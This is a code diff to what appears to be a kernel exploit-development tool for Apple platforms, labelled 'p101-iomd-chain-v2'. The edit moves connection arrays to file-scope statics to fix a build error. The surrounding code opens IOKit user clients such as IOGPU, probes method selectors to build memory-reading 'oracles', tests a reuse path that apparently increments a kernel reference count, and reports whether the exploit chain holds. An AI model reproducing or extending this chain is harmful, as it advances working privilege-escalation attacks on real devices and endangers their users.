@@ -104,6 +104,12 @@ typedef struct {
     int          alive;
 } p101_oracle_t;
 
+/* file-scope: clang forbids referencing automatic arrays inside blocks
+   (CI lesson 2026-10-27, first red Lum1na Build on this build). The tap
+   is single-threaded, so statics carry no cross-tap state that matters. */
+static io_connect_t p101_conns[P101_MAX_CONNS];
+static char p101_connWho[P101_MAX_CONNS][64];
+
 static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
     if (!out || outsz < 0x10) return 0xffffffffu;
     uint32_t w; memcpy(&w, out + 0xc, 4); return w;
@@ -222,15 +228,13 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
     L([NSString stringWithFormat:@"[*] IOConnectCallStructMethod=%p (struct lane reads)", csm]);
     if (!csm) L(@"[!] struct-method absent — oracle reduced to scalar census only.");
 
-    io_connect_t conns[P101_MAX_CONNS];
-    char connWho[P101_MAX_CONNS][64];
     unsigned nConn = 0;
     io_service_t gpu = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGPU"));
     void *dev = NULL;
     if (gpu && pDevCreate) {
         dev = pDevCreate(gpu);
         io_connect_t gc = (dev && pGetConn) ? (io_connect_t)pGetConn(dev) : 0;
-        if (gc) { conns[nConn] = gc; snprintf(connWho[nConn], 64, "IOGPU"); nConn++; }
+        if (gc) { p101_conns[nConn] = gc; snprintf(p101_connWho[nConn], 64, "IOGPU"); nConn++; }
         L([NSString stringWithFormat:@"[*] IOGPUDeviceCreate %p conn=%u", dev, gc]);
     }
     if (gpu) IOObjectRelease(gpu);
@@ -244,8 +248,8 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
             for (uint32_t ty = 0; ty < 2 && nConn < P101_MAX_CONNS; ty++) {
                 io_connect_t c = 0;
                 if (IOServiceOpen(svc, mach_task_self(), ty, &c) == KERN_SUCCESS && c) {
-                    conns[nConn] = c;
-                    snprintf(connWho[nConn], 64, "%s/t%u", svcs[i], ty);
+                    p101_conns[nConn] = c;
+                    snprintf(p101_connWho[nConn], 64, "%s/t%u", svcs[i], ty);
                     nConn++;
                 }
             }
@@ -258,7 +262,7 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
     /* name lookup used by oracle + release lines */
     NSString *(^connOf)(io_connect_t) = ^(io_connect_t c) {
         for (unsigned i = 0; i < nConn; i++)
-            if (conns[i] == c) return [NSString stringWithUTF8String:connWho[i]];
+            if (p101_conns[i] == c) return [NSString stringWithUTF8String:p101_connWho[i]];
         return @"?";
     };
 
@@ -315,18 +319,18 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
             for (uint32_t sel = 0; sel < P101_ORACLE_SELS; sel++) {
                 uint8_t outb[P101_OUT_SZ];
                 size_t outsz = sizeof(outb);
-                kern_return_t kr = gateRead(conns[ci], sel, outb, &outsz);
+                kern_return_t kr = gateRead(p101_conns[ci], sel, outb, &outsz);
                 if (kr != KERN_SUCCESS) continue;
                 if (outsz < 0x10) continue;
                 uint32_t w = p101_gate_w(outb, outsz);
                 L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u out+0xc=0x%08x hex(0..f)=%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
-                   connWho[ci], sel, w,
+                   p101_connWho[ci], sel, w,
                    outb[0], outb[1], outb[2], outb[3],
                    outb[4], outb[5], outb[6], outb[7],
                    outb[8], outb[9], outb[10], outb[11],
                    outb[12], outb[13], outb[14], outb[15]]);
                 if (nOracle < P101_MAX_ORACLES) {
-                    oracles[nOracle].conn = conns[ci];
+                    oracles[nOracle].conn = p101_conns[ci];
                     oracles[nOracle].sel = sel;
                     oracles[nOracle].s_map = w;
                     oracles[nOracle].s_unmap = 0xffffffffu;
@@ -377,14 +381,14 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
             for (uint32_t sel = 0; sel < P101_ORACLE_SELS; sel++) {
                 uint8_t outb[P101_OUT_SZ];
                 size_t outsz = sizeof(outb);
-                kern_return_t kr = gateRead(conns[ci], sel, outb, &outsz);
+                kern_return_t kr = gateRead(p101_conns[ci], sel, outb, &outsz);
                 if (kr != KERN_SUCCESS) continue;
                 if (outsz < 0x10) continue;
                 uint32_t w = p101_gate_w(outb, outsz);
                 L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u out+0xc=0x%08x",
-                   connWho[ci], sel, w]);
+                   p101_connWho[ci], sel, w]);
                 if (nOracle < P101_MAX_ORACLES) {
-                    oracles[nOracle].conn = conns[ci];
+                    oracles[nOracle].conn = p101_conns[ci];
                     oracles[nOracle].sel = sel;
                     oracles[nOracle].s_map = w;
                     oracles[nOracle].s_unmap = 0xffffffffu;
@@ -415,7 +419,7 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
     L(@"--- LANE PICK (v1 shape, one pass) ---");
     for (unsigned ci = 0; ci < nConn && acquireConn == 0; ci++) {
         for (uint32_t sel = 0; sel < P101_ORACLE_SELS && acquireConn == 0; sel++) {
-            kern_return_t kr = tryShape(conns[ci], connWho[ci], sel, va, len, 0, NULL, P101_OUT_SZ);
+            kern_return_t kr = tryShape(p101_conns[ci], p101_connWho[ci], sel, va, len, 0, NULL, P101_OUT_SZ);
             if (kr != KERN_SUCCESS) continue;
             /* reuse: same addr+len = the 43684 increment path */
             uint8_t outb[P101_OUT_SZ];
@@ -429,11 +433,11 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
             uint32_t p4 = 0, p5 = 0;
             memcpy(in + 16, &p4, 4);
             memcpy(in + 20, &p5, 4);
-            kern_return_t krx = IOConnectCallMethod(conns[ci], sel, NULL, 0, in, 24,
+            kern_return_t krx = IOConnectCallMethod(p101_conns[ci], sel, NULL, 0, in, 24,
                                                     scOut, &scOutCnt, outb, &outsz);
-            L([NSString stringWithFormat:@"    REUSE %s sel=%u kr=0x%x (acquire lane test)", connWho[ci], sel, krx]);
+            L([NSString stringWithFormat:@"    REUSE %s sel=%u kr=0x%x (acquire lane test)", p101_connWho[ci], sel, krx]);
             if (krx == KERN_SUCCESS) {
-                acquireConn = conns[ci];
+                acquireConn = p101_conns[ci];
                 acquireSel = sel;
             }
         }
@@ -626,7 +630,7 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
     /* ---------- cleanup --------------------------------------------------- */
     if (mapped) mach_vm_deallocate(mach_task_self(), mapped, (mach_vm_size_t)P101_SURF_LEN);
     if (mdport) mach_port_deallocate(mach_task_self(), mdport);
-    for (unsigned ci = 0; ci < nConn; ci++) IOServiceClose(conns[ci]);
+    for (unsigned ci = 0; ci < nConn; ci++) IOServiceClose(p101_conns[ci]);
     if (dev && pDevRelease) pDevRelease(dev);
     if (surf) CFRelease(surf);
     CFRelease(dict);
@@ -634,7 +638,7 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
 
     /* ---------- PHASE 4 — VERDICT ------------------------------------------ */
     L(@"=== VERDICT (p101-iomd-chain-v2) ===");
-    L([NSString stringWithFormat:@"[*] chain: lane %@ / oracle %s / retain-wrapped %s:",
+    L([NSString stringWithFormat:@"[*] chain: lane %@ / oracle %@ / retain-wrapped %@:",
        acquireConn ? @"Y" : @"N",
        nCorro ? @"CORROBORATED" : @"UNPROVEN",
        wrapped ? @"Y" : @"N"]);
